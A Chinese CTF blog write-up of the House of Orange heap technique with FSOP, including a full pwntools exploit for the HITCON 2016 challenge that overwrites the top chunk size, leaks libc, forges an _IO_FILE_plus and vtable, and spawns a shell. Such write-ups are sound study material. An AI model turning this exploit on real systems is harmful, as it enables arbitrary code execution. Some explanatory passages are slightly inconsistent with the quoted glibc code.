---
title: "House of orange"
description: "申请大于 top chunk 时，top chunk 会被放进 unsorted bin；再配合 unsorted bin attack 覆写 _IO_list_all，伪造 _IO_FILE_plus 走 FSOP。"
pubDate: 2025-03-10
category: pwn
tags: [io-file]
---

## 前言

久仰 **house of orange** 大名，真研究下来发现并不算难；FSOP 是第一次接触，思路很惊艳。

## House of orange

### 条件

只有一个：**能改到 `top chunk` 的 `size` 字段**（堆溢出、越界写都行）。

### 利用

把 `top chunk` 的 `size` 改小之后，再申请一个比它大的 chunk，`malloc` 会认为 top 不够用，于是：

1. 把这块 `top chunk` 链进 `unsorted bin`；
2. 用 `mmap` 重新要一块新的 top。

到这一步，`unsorted bin` 里就躺着一个 size 被我们改过的 chunk。接下来只要在合适的时机触发 `malloc`，`unsorted bin` 的整理逻辑就会按 size 把它归到对应的 `small bin`／`large bin`，链表的指针也随之被我们左右。

## FSOP

核心是把 `_IO_list_all` 劫持到伪造的 `_IO_FILE_plus` 上：`_IO_flush_all_lockp` 会沿着 `_IO_list_all` 遍历这条 `_IO_FILE` 链表，对每个结构调用它 `vtable` 里的 `_IO_OVERFLOW`。所以只要让遍历走到一个由我们控制的伪造结构，并且把它的 vtable 换掉（比如指向 `_IO_str_jumps` 附近，让 `_IO_OVERFLOW` 落到 `system`），就能拿到执行流。

`_IO_flush_all_lockp` 会在三种情况下被触发：
- 执行 `abort` 流程时
- 执行 `exit()` 函数时
- 正常结束 `main()` 函数（本质上就是情况二）

## 示例

### HITCON 2016 house of orange

```C
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3;      // eax

  int(a1, a2, a3);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();  //   puts("+++++++++++++++++++++++++++++++++++++");
               //   puts("@          House of Orange          @");
               //   puts("+++++++++++++++++++++++++++++++++++++");
               //   puts(" 1. Build the house                  ");
               //   puts(" 2. See the house                    ");
               //   puts(" 3. Upgrade the house                ");
               //   puts(" 4. Give up                          ");
               //   puts("+++++++++++++++++++++++++++++++++++++");
               //   return printf("Your choice : ");
      v3 = getc();
      if ( v3 != 2 )
        break;
      see();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        upgrade();
      }
      else
      {
        if ( v3 == 4 )
        {
          puts("give up");
          exit(0);
        }
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_13;
      build();
    }
  }n
}
```

#### 漏洞分析
```C
int upgrade()
{
  aaa *one;         // rbx
  unsigned int v2;  // [rsp+8h] [rbp-18h]
  int v3;           // [rsp+Ch] [rbp-14h]

  if ( chance > 2u )
    return puts("You can't upgrade more");
  if ( !tmp )
    return puts("No such house !");
  printf("Length of name :");
  v2 = getc();
  if ( v2 > 0x1000 )
    v2 = 4096;
  printf("Name:");
  readsth(tmp->name, v2);
  printf("Price of Orange: ");
  one = tmp->one;
  one->price = getc();
  putsth();
  printf("Color of Orange: ");
  v3 = getc();
  if ( v3 != 56746 && (v3 <= 0 || v3 > 7) )
  {
    puts("No such color");
    exit(1);
  }
  if ( v3 == 56746 )
    tmp->one->color = 56746;
  else
    tmp->one->color = v3 + 30;
  ++chance;
  return puts("Finish");
}
```
`upgrade()` 会再读一次 name 的长度，用的却是攻击者自己填的 size，没有和申请时的大小比对——这就给了堆溢出，也是整条利用链的入口。

#### exp
```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

libc = ELF('./libc-2.23.so')

io = process('./houseoforange_hitcon_2016')
gdb.attach(io, 'b *$rebase(0x13C6)')

def cmd(c: int):
    io.recvuntil(b'Your choice : ')
    io.sendline(str(c).encode())

def build(length: int, name: bytes, price: int = 1, color: int = 0xDDAA):
    cmd(1)
    io.recvuntil(b'Length of name :')
    io.sendline(str(length).encode())
    io.recvuntil(b'Name :')
    io.send(name)
    io.recvuntil(b'Price of Orange:')
    io.sendline(str(price).encode())
    io.recvuntil(b'Color of Orange:')
    io.sendline(str(color).encode())

def see():
    cmd(2)

def upgrade(length: int, name: bytes, price: int = 1, color: int = 0xDDAA):
    cmd(3)
    io.recvuntil(b'Length of name :')
    io.sendline(str(length).encode())
    io.recvuntil(b'Name:')
    io.send(name)
    io.recvuntil(b'Price of Orange: ')
    io.sendline(str(price).encode())
    io.recvuntil(b'Color of Orange: ')
    io.sendline(str(color).encode())

build(0x10, b'a')

extend = b'a'*0x10
extend += p64(0) + p64(0x21) + p32(1) + p32(0xDDAA) + p64(0)
extend += p64(0) + p64(0xfa1)

'''
0xfa1是通过第一次分配的堆块的大小来计算的,0x20
正常不覆盖大小应该是0x20fa1
之所以这样是为了绕过检测
'''

upgrade(len(extend), extend)
'''
此时top chunk的大小就被覆盖为0xfa1了
'''

build(0x1000, b'junk')
'''
触发 house of orange
将top chunk放入unsorted bin
因为申请的chunk大小为0x1000,而top chunk的大小只有0xfa1
'''

build(0x400, b'c'*8)
'''
malloc并不会清理chunk的内容
所以,可以泄露libc内容
'''

see()
io.recvuntil(b'c'*8)
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\0'))-0x3c5188
log.success('libc_base: ' + hex(libc_base))
IO_list_all = libc_base + libc.sym['_IO_list_all']
log.success('IO_list_all: ' + hex(IO_list_all))
system = libc_base + libc.sym['system']
log.success('system: ' + hex(system))
'''
泄露libc
'''

upgrade(0x10, b'abcd'*4)
see()
io.recvuntil(b'abcdabcdabcdabcd')
heap_base = u64(io.recvn(6).ljust(8, b'\0'))-0xc0
info('heap_base: ' + hex(heap_base))
'''
覆盖fd和bk
fd_nextsize和bk_nextsize写的是heap地址
'''

vtable_addr = heap_base + 0xd0

'''
伪造虚函数表
'''
vtable = p64(0)*3+p64(system)
vtable = vtable.ljust(0x400, b'\0')

extend = vtable

'''
伪造_IO_FILE结构体
'''
extend += p64(0)+p64(0x21)
extend += p32(1)+p32(0xDDAA)+p64(0)
extend += b'/bin/sh\x00'+p64(0x61)
# 这个0x61的原因写在后记中
extend += p64(0)+p64(IO_list_all-0x10)
extend += p64(0)+p64(1)
extend += p64(0)*21
extend += p64(vtable_addr)
upgrade(len(extend), extend)

'''
触发unsorted bin attack
'''
cmd(1)

io.interactive()
```

### 后记

#### 流程
> 调用链：_libc_malloc -> malloc_printerr -> libc_message -> abort -> fflush(_IO_fflush) -> _IO_flush_all -> _IO_flush_all_lockp -> _IO_OVERFLOW

#### 0x61
关键在于 `_IO_FILE` 的 `_chain` 字段——它决定遍历时下一个结构在哪。

`_IO_list_all` 被劫持成 `main_arena+88` 之后，按 `_chain` 的偏移（`0x68`）算出来正好是 `main_arena+168`，而那正是 `small bin[0x60]` 的链表头。

于是把 `unsorted bin` 里那个 chunk 的 size 字段改成 `0x61`（即 0x60 大小的 chunk）：下次 `malloc` 整理 `unsorted bin` 时，它会按这个 size 被挂进 `small bin[0x60]`，而挂进去就会改写这块链表的 `bk`——也就是让 `main_arena+168` 指向我们堆上伪造的结构。

遍历走到这里，第二个 `_IO_FILE` 就是我们伪造的 `_IO_FILE_plus`。

#### 概率通过

这一步有时能过有时不能，差别在结构体的 `_mode` 字段。

遍历时每个结构都要先过一遍 `_IO_flush_all_lockp` 的检查，`_mode` 为正就会被认定"需要 flush"，直接调用 `_IO_OVERFLOW`。而第一个结构其实是 arena 里的垃圾数据，它一崩，程序就在走到我们伪造的结构之前结束了。所以要让 `_mode` 落在负数区间，把第一个结构跳过去。
```C
int
_IO_flush_all_lockp (int do_lock) # do_lock = 1
{
  int result = 0;
  struct _IO_FILE *fp;
  int last_stamp;

#ifdef _IO_MTSAFE_IO
  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
  if (do_lock)
    _IO_lock_lock (list_all_lock);
#endif

  last_stamp = _IO_list_all_stamp;
  fp = (_IO_FILE *) _IO_list_all;
  while (fp != NULL)
    {
      run_fp = fp;
      if (do_lock)
    _IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
       || (_IO_vtable_offset (fp) == 0
           && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                    > fp->_wide_data->_IO_write_base))
#endif
       )
      && _IO_OVERFLOW (fp, EOF) == EOF)
    result = EOF;

      if (do_lock)
    _IO_funlockfile (fp);
      run_fp = NULL;

      if (last_stamp != _IO_list_all_stamp)
    {
      /* Something was added to the list.  Start all over again.  */
      fp = (_IO_FILE *) _IO_list_all;
      last_stamp = _IO_list_all_stamp;
    }
      else
    fp = fp->_chain;
    }

#ifdef _IO_MTSAFE_IO
  if (do_lock)
    _IO_lock_unlock (list_all_lock);
  __libc_cleanup_region_end (0);
#endif

  return result;
}
```

而我们只控制了第二个结构体的 `vtable`，程序就直接结束了。
